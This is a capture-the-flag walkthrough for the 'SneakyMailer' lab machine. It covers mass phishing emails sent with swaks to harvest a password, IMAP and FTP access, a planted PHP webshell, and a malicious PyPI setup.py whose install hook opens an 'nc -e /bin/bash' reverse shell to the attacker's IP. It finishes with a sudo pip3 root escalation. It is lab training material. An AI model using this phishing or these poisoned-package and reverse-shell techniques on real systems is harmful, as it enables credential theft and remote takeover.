# SneakyMailer

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.2.28   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 08:18 EDT
Nmap scan report for 10.129.2.28
Host is up (0.019s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
143/tcp  open  imap
993/tcp  open  imaps
8080/tcp open  http-proxy
```

Based on the name of the box, I would guess that we have to do something with emails here. Also, FTP doesn't accept anonymous logins. We have to add `sneakycorp.htb` to our `/etc/hosts` file to access port 80.

### SneakyCorp

The website is some kind of Dashboard.

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

If we click on Team, we can see a table with a ton of emails present:

<figure><img src="../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

We can download all of this itno a file using `curl`.&#x20;

{% code overflow="wrap" %}
```bash
curl http://sneakycorp.htb/team.php | grep '@' | cut -d '>' -f2  | cut -d '<' -f1 > emails
```
{% endcode %}

I did a `wfuzz` scan for directories and vhosts, and did find one:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw=12 -H 'Host: FUZZ.sneakycorp.htb' -u http://sneakycorp.htb 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sneakycorp.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000019:   200        340 L    989 W      13737 Ch    "dev" 
```

### Phishing Emails

Based on the name of this machine, I think we have to send emails to all of these and see if anyone clicks on any links that we have sent. This works because the mail ports are open and the machine should be able to receive them.

We can first set up a web listener via `nc -lvnp 80`. Then, we need a way to send the mail to all users at once because there are a load of emails present. I checked Hacktricks and unintentionally a small walkthrough for the machine.&#x20;

{% code overflow="wrap" %}
```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.13/" --server 10.129.2.28
```
{% endcode %}

I just used this to send my emails easily. After a little bit, on the listener port, I got a callback.

{% code overflow="wrap" %}
```
$ nc -lvnp 80           
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.2.28] 43302
POST / HTTP/1.1
Host: 10.10.14.13
User-Agent: python-requests/2.23.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 185
Content-Type: application/x-www-form-urlencoded

firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
```
{% endcode %}

It seems that we have a password being sent here.&#x20;

### IMAP --> FTP Creds --> RCE

This password does not work with `ssh` or any other services. Instead, let's try to login on IMAP and see if we can view any other messages that this user has.&#x20;

{% code overflow="wrap" %}
```
$ nc 10.129.2.28 143
* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
A1 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
A1 OK LOGIN Ok.
```
{% endcode %}

Works! Now we can enumerate this system. We can view the Inboxes and messages present:

{% code overflow="wrap" %}
```
A1 LIST INBOX *
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
A1 OK LIST completed

A1 SELECT "INBOX.Sent Items"
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
A1 OK [READ-WRITE] Ok
A1 FETCH 2 all
* 2 FETCH (FLAGS (\Seen) INTERNALDATE "23-Jun-2020 09:27:08 -0400" RFC822.SIZE 585 ENVELOPE ("Wed, 27 May 2020 13:28:58 -0400" "Module testing" (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) (("Paul Byrd" NIL "paulbyrd" "sneakymailer.htb")) ((NIL NIL "low" "debian")) NIL NIL NIL "<4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>"))
A1 OK FETCH completed.

A1 FETCH 1 body[text]
* 1 FETCH (BODY[TEXT] {1888}
--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```
{% endcode %}

It seems that we have found a password. Still doesn't work with SSH, but it does with the FTP server. There's a `dev` directory present here. When checking the files present, we notice that this has the same `team.php` file as the website.

```
ftp> ls -la
229 Entering Extended Passive Mode (|||15445|)
150 Here comes the directory listing.
drwxrwxr-x    8 0        1001         4096 Jun 30  2020 .
drwxr-xr-x    3 0        0            4096 Jun 23  2020 ..
drwxr-xr-x    2 0        0            4096 May 26  2020 css
drwxr-xr-x    2 0        0            4096 May 26  2020 img
-rwxr-xr-x    1 0        0           13742 Jun 23  2020 index.php
drwxr-xr-x    3 0        0            4096 May 26  2020 js
drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
drwxr-xr-x    4 0        0            4096 May 26  2020 scss
-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
```

Also, we have write permissions over this directory. We can try to place a webshell here and see if it gets uploaded onto the main website itself.&#x20;

This doesn't get uploaded to `sneakycorp.htb`, but it does get uploaded to `dev.sneakycorp.htb`.&#x20;

```
$ curl http://dev.sneakycorp.htb/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We now have RCE and can get an easy reverse shell by putting a PHP Reverse Shell within the website files:

<figure><img src="../../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PyPI

There are a couple of users present on the machine:

```
www-data@sneakymailer:/home$ ls -la
total 16
drwxr-xr-x  4 root  root  4096 May 14  2020 .
drwxr-xr-x 18 root  root  4096 May 14  2020 ..
drwxr-xr-x  8 low   low   4096 Jun  8  2020 low
drwx------  5 vmail vmail 4096 May 19  2020 vmail
```

We can take a look at the `/var/www` files to see what other files are present on the system:

```
www-data@sneakymailer:~$ ls -la
total 24
drwxr-xr-x  6 root root 4096 May 14  2020 .
drwxr-xr-x 12 root root 4096 May 14  2020 ..
drwxr-xr-x  3 root root 4096 Jun 23  2020 dev.sneakycorp.htb
drwxr-xr-x  2 root root 4096 May 14  2020 html
drwxr-xr-x  4 root root 4096 May 15  2020 pypi.sneakycorp.htb
drwxr-xr-x  8 root root 4096 Jun 23  2020 sneakycorp.htb
```

So there's a `pypi.sneakycorp.htb` domain present. With some testing, I found it runs on port 8080.&#x20;

<figure><img src="../../../.gitbook/assets/image (172) (2).png" alt=""><figcaption></figcaption></figure>

Within the files, I also found a `.htpasswd` file with a hash:

```
www-data@sneakymailer:~/pypi.sneakycorp.htb$ cat .htpasswd 
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

This can be cracked to give `soufianeelhaoui`. It would appear we have to somehow upload a Python package to this website as the next step to get a user shell. I followed this guide to create one:

{% embed url="https://www.linode.com/docs/guides/how-to-create-a-private-python-package-repository/" %}

And this one on where to inject the malicious code:

{% embed url="https://github.com/mschwager/0wned" %}

First, we need to create a `setup.py` file:

```python
import os
import socket
import subprocess
from setuptools import setup
from setuptools.command.install import install

class Shell(install):
    def run(self):
        if (os.getuid() == 1000):
            os.system('nc -e /bin/bash 10.10.14.13 4444')

setup(name='revshell',
      version='0.0.1',
      description='shell',
      author='test',
      author_email='test',
      url='http://test.com',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': Shell})
```

We also need to create a `.pypirc` file:

```
[distutils]
index-servers = local
[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

Then, we can download both of these files to the machine and run this command as `developer` (`su` usinng the FTP password):

```bash
HOME=$(pwd)
python3 setup.py sdist register -r local upload -r local
```

This would upload the package. Wait for a bit, and a reverse shell should occur as `low`.

<figure><img src="../../../.gitbook/assets/image (191).png" alt=""><figcaption></figcaption></figure>

We can then grab the user flag.

### Sudo pip3

We can enumerate the user's `sudo` privileges:

```
low@sneakymailer:/$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

Based on GTFOBins, we just need to run these commands:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip3 install $TF
```

This would give us a root shell.&#x20;

<figure><img src="../../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

Rooted!
